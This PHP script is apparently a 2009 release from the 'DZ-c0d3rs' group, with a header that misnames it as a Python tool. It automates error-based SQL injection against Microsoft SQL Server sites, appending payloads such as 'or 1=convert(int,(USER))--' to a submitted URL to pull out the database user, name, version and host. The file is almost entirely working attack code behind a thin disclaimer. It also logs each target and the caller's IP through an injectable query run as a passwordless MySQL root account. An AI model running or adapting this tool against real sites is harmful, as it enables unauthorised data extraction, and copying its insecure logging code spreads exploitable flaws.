<?php
//|------------------------------------------------|
//| DZ.c0d3rs[@]gmail[dot]com                 v1.0 |
//| 11/01/2009   darkMSSQL.py                      |
//|      -MSSQL Error Based Database Enumeration   |
//|      -MSSQL Server Information Enumeration     |
//|      -MSSQL Data Extractor                     |
//|                                                |
//|  [Public release]      DZ-c0d3rs Security Team |
//|------------------------------------------------|

# Share the c0de!

# DZ-c0d3rs Crew 
# DZ.c0d3rs[@]gmail[dot]com

# Greetz to 
# Darkc0de members
# and the DZ-c0d3rs crew

# NOTES: 

# This was written for educational purpose only. Use it at your own risk.
# Author will be not responsible for any damage caused! User assumes all responsibility 
# Intended for authorized Web Application Pen Testing Only!

# BE WARNED, THIS TOOL IS VERY LOUD..
$start=date('H\:i\:s');
$date=date('d/m/Y');
$date="Done in ".$date." at ".$start;
$s=time();
$ip= $_SERVER["REMOTE_ADDR"];
if ($_POST['link'] != NULL){
$url_ori= htmlspecialchars($_POST["link"]);
//rempalcing escape,quote and double quote by hex values
$url_ori=ereg_replace(' ','%20',$url_ori);
$url_ori=ereg_replace("'",'%27',$url_ori);
$url_ori=ereg_replace('"','%22',$url_ori);
//
ini_set ("max_execution_time","8640000");

function convert($chuoi)
{
	$temp="";
	$temp="char(";
	for ($i=0;$i<strlen($chuoi)-1;$i++)
	{
		$temp.=ord($chuoi[$i]).")+char(";
	}
	$temp.=ord($chuoi[strlen($chuoi)-1]).")";
	return $temp;
	}

class CURL 
{
	var $callback = false;

	function setCallback($func_name) 
	{
		$this->callback = $func_name;
	}

	function doRequest($method, $url, $vars) 
	{
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_HEADER, 1);
		curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
		curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
		if ($method == 'POST') 
		{
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $vars);
		}
		$data = curl_exec($ch);
		curl_close($ch);
		if ($data) 
		{
			if ($this->callback)
			{
				$callback = $this->callback;
				$this->callback = false;
				return call_user_func($callback, $data);
			} 
			else 
			{
			return $data;
			}
		} 
		else
		{
		return curl_error($ch);
		}
	}

	function get($url) 
	{
		return $this->doRequest('GET', $url, 'NULL');
	}

	function post($url, $vars) 
	{
		return $this->doRequest('POST', $url, $vars);
	}
}
$cc = new CURL();echo "<pre>";
echo "<b>[+] Displaying information about MSSQL host!\n</b><br>";

// Diplaying current user name
$url=$url_ori."+or+1=convert(int,(USER))--sp_password";
$dat = $cc->get("$url");
@eregi ("value '(.*)' to",$dat,$out);
$get_user=$out[1];
echo "<b>Current User: </b>".$get_user."\n";
$resultats="Current User: ".$get_user."\n";

// Diplaying current data base name
$url=$url_ori."+or+1=convert(int,(DB_NAME()))--sp_password";
$dat = $cc->get("$url");
@eregi ("value '(.*)' to",$dat,$out);
$get_name=$out[1];
echo "<b>Current Data Base: </b>".$get_name."\n";
$resultats=$resultats."Current Data Base: ".$get_name."\n";

// Diplaying current version of data base
$url=$url_ori."+or+1=convert(int,@@version)--sp_password";
$dat = $cc->get("$url");
@eregi ("value '(.*)' to",$dat,$out);
$get_version=$out[1];
echo "<b>Microsoft SQL Version: </b>".$get_version."";
$resultats=$resultats."Microsoft SQL Version: ".$get_version."\n";

// Diplaying Host information
$url=$url_ori."+or+1=convert(int,HOST_NAME())--sp_password";
$dat = $cc->get("$url");
@eregi ("value '(.*)' to",$dat,$out);
$get_host=$out[1];
echo "<b>Host information: </b>".$get_host."<br>";
$resultats=$resultats."Host information: ".$get_host."\n";
	}
	else{
		echo "<pre>";
	echo "<b>You must put all requests informations to do injection</b><br><br>";
	}
# Closing Info 
$finish=date('H\:i\:s');
$f=time();
$times=($f-$s);
$hour=0;
$min=0;
if($times>60){
$time=$times/60;
$min=intval($time);
$sec=$time-$min;
$sec=$sec*60;
}elseif($min>60){
$t=$min/60;
$hour=intval($t);
$min=$t-$hour;
$min=$min*60;
}else
{
$sec=$times;
}
echo "<b><br>\n[-] Started   at: " .$start.".<br>";
$resultats=$resultats."\n[-] Started   at: " .$start.".\n";
echo "[-] Finished  at: " .$finish.".<br>";
$resultats=$resultats."[-] Finished  at: " .$finish.".\n";
echo "[-] Total times : " .$times." Second(s).<br>";
$resultats=$resultats."[-] Total times : " .$times." Second(s).\n";
echo "[-] detail time : " .$sec." Second(s) and ".$min." Minute(s) and ".$hour." hour(s).<br>";
$resultats=$resultats."[-] detail time : " .$sec." Second(s) and ".$min." Minute(s) and ".$hour." hour(s).\n";
echo "[-] ".$date.".\n<br></b>";
mysql_connect("localhost", "root", "");
mysql_select_db("dz");
mysql_query("INSERT INTO info VALUES('','$url_ori', '$resultats', '$ip','$date')");
mysql_close();
?>